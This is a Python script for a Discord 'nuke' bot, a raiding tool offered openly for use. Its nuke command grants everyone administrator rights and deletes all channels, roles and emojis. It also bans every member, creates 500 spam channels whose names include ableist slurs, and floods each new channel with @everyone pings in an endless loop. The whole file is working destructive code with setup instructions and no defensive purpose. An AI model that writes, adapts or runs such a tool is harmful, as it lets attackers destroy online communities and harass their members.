import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

# Check readme.md for lastest updates

token = "PasteHere"

# If you are having issues, watch this video: https://streamable.com/7eovst or follow message listed below

#  If it says Shared ID None is requesting privileged intents, go to discord developer portal and go to your bot and click on the bot tab and then scroll down to where it says privileged gateway intents and enable both, then it should work

SPAM_CHANNEL = [
    "retard-mods", "imagine-being-nuked", "wassup-sis", "ez-peez-bro",
    "dont-mess-with-us", "adopted ", "nuked nuked", "how are u feeling",
    "take-some-pings", "Get on my level but you cant", "helo-simps",
    "have-fun-bois", "leave-this-server-nerds", "retard-owner-haha"
]
SPAM_MESSAGE = ["@everyone @here Server Got Raided How are ya feeling XD"]

intents = discord.Intents(messages=True, guilds=True, members=True)

client = commands.Bot(command_prefix='.', intents=intents)


@client.event
async def on_ready():
    print(
        '''    ____  _                          __   _   __      __           ____        __ 
   / __ \(_)_____________  _________/ /  / | / /_  __/ /_____     / __ )____  / /_
  / / / / / ___/ ___/ __ \/ ___/ __  /  /  |/ / / / / //_/ _ \   / __  / __ \/ __/
 / /_/ / (__  ) /__/ /_/ / /  / /_/ /  / /|  / /_/ / ,< /  __/  / /_/ / /_/ / /_  
/_____/_/____/\___/\____/_/   \__,_/  /_/ |_/\__,_/_/|_|\___/  /_____/\____/\__/'''
    )
    await client.change_presence(activity=discord.Game(name="With Kittens"))


@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully!" +
          Fore.RESET)


@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.BLUE + "I have given everyone admin." + Fore.RESET)
    except:
        print(Fore.BLUE + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.GREEN + f"{channel.name} was deleted." + Fore.RESET)
        except:
            print(Fore.ORANGE + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
        try:
            await member.ban()
            print(Fore.GREEN +
                  f"{member.name}#{member.discriminator} Was banned" +
                  Fore.RESET)
        except:
            print(
                Fore.ORANGE +
                f"{member.name}#{member.discriminator} Was unable to be banned."
                + Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.GREEN + f"{role.name} Has been deleted" + Fore.RESET)
        except:
            print(Fore.ORANGE + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.GREEN + f"{emoji.name} Was deleted" + Fore.RESET)
        except:
            print(Fore.ORANGE + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban("Gru#4109")
            print(
                Fore.BLUE +
                f"{user.name}#{user.discriminator} Was successfully unbanned."
                + Fore.RESET)
        except:
            print(Fore.BLUE +
                  f"{user.name}#{user.discriminator} Was not unbanned." +
                  Fore.RESET)
    await guild.create_text_channel("henlo")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Nuked {guild.name} Successfully.")
    return


@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))


client.run(token, bot=True)
